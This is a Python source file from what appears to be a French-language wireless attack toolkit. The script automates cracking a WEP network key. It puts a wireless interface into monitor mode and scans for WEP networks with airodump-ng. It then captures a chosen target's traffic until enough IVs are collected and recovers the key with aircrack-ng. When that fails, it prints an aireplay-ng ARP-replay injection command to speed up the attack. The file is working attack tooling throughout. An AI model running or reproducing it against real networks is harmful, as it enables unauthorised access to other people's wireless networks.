
# app/attacks/wep_cracker.py
import os
import re
import subprocess
import sys
import time

from app.config import (
    Colors, cprint, run, ask, list_interfaces, is_root, iface_exists,
    is_valid_mac, is_valid_channel,
)

REQUIRED_TOOLS = ["airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng", "iw"]


def check_tools():
    missing = [t for t in REQUIRED_TOOLS
               if subprocess.run(f"which {t}", shell=True,
                                 capture_output=True).returncode != 0]
    if missing:
        print(f"[-] Outils manquants : {', '.join(missing)}")
        print("[i] Lance : sudo ./scripts/install_deps.sh")
        return False
    return True


def configure_monitor_mode(iface):
    print(f"[*] Passage de {iface} en mode monitor...")
    if run(f"iw dev {iface} info", capture=False) != 0:
        print(f"[-] Interface {iface} introuvable.")
        return False
    run(f"ip link set {iface} down", capture=False)
    if run(f"iw dev {iface} set type monitor", capture=False) != 0:
        print(f"[-] Impossible de passer {iface} en monitor.")
        return False
    run(f"ip link set {iface} up", capture=False)
    print(f"[+] {iface} est en mode monitor.")
    return True


def show_networks_wep(iface):
    print(f"\n[*] Scan WEP sur {iface} (Ctrl+C pour arrêter)...")
    print("[i] Note BSSID et canal cible.\n")
    try:
        subprocess.run(f"airodump-ng --encrypt WEP {iface}", shell=True)
    except KeyboardInterrupt:
        pass


def choose_target(channel, bssid, iface, output_file):
    """Capture jusqu'à >= 5000 IVs et >= 60000 data. Retourne le .cap ou None."""
    print(f"\n[*] Capture sur {bssid} (canal {channel})...")
    print(f"[i] Fichiers : {output_file}-*.cap")
    run(f"rm -f {output_file}-*", capture=False)
    run(f"airodump-ng --channel {channel} --bssid {bssid} "
        f"--write {output_file} {iface}", background=True)

    cap_file = None
    try:
        while True:
            time.sleep(5)
            for f in os.listdir("."):
                if f.startswith(output_file) and f.endswith(".cap"):
                    cap_file = f
                    break
            if not cap_file:
                continue
            subprocess.run(f"aircrack-ng {cap_file} > /tmp/wep_out.txt 2>&1",
                           shell=True)
            with open("/tmp/wep_out.txt") as f:
                out = f.read()
            ivs = int(m.group(1)) if (m := re.search(r"(\d+)\s+IVs", out)) else 0
            data = int(m.group(1)) if (m := re.search(r"(\d+)#Data", out)) else 0
            print(f"[i] IVs: {ivs} | Data: {data}")
            if ivs >= 5000 and data >= 60000:
                print("[+] Assez d'IVs collectés.")
                break
    except KeyboardInterrupt:
        print("\n[+] Interrompu.")
    run("pkill airodump-ng", capture=False)
    return cap_file


def crack_wep_net(pcap_file):
    print(f"\n[*] Cassage WEP : {pcap_file}")
    return subprocess.run(f"aircrack-ng {pcap_file}", shell=True).returncode == 0


def main():
    if not is_root():
        cprint("[-] Root requis.", Colors.RED, bold=True)
        sys.exit(1)
    if not check_tools():
        sys.exit(1)

    cprint("Attaque WEP", Colors.GREEN, bold=True)
    list_interfaces()
    iface = ask("Interface monitor (ex: wlan1mon)", default="wlan1mon",
                validator=iface_exists)
    if not configure_monitor_mode(iface):
        sys.exit(1)

    show_networks_wep(iface)

    bssid = ask("BSSID cible", validator=is_valid_mac)
    channel = ask("Canal (1-14)", validator=is_valid_channel)
    out = ask("Fichier capture", default="wep_capture")

    cap = choose_target(int(channel), bssid, iface, out)
    if not cap:
        print("[-] Aucune capture.")
        sys.exit(1)

    ok = crack_wep_net(cap)
    if ok:
        cprint("[+] Clé WEP trouvée !", Colors.GREEN, bold=True)
        sys.exit(0)
    print("[-] Échec. Astuce : accélère avec :")
    print(f"    sudo aireplay-ng --arpreplay -b {bssid} -h <MAC_client> {iface}")
    sys.exit(1)


if __name__ == "__main__":
    main()